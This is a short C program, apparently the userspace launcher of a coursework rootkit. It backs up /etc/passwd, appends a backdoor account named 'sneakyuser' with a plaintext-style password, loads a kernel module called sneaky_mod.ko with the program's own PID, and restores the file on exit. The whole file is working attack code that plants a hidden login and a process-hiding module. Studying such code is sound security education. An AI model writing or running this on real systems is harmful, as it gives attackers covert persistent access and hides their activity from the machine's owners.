#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>


void copy_passwd() {
     system("cp /etc/passwd /tmp");
     system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> "
               "/etc/passwd");
}
void load_module() {
     char cmd[100];
     sprintf(cmd, "insmod sneaky_mod.ko pid=%d", getpid());
     system(cmd);
}

void wait_for_exit() {
     char c;
     while ((c = getchar()) != 'q');
}

void restore_passwd() {
     system("cp /tmp/passwd /etc");
}

int main() {
     printf("sneaky_process pid = %d\n", getpid());
     copy_passwd();
     load_module();
     wait_for_exit();
     // system("rmmod sneaky_mod"); 
     restore_passwd();
     return EXIT_SUCCESS;
}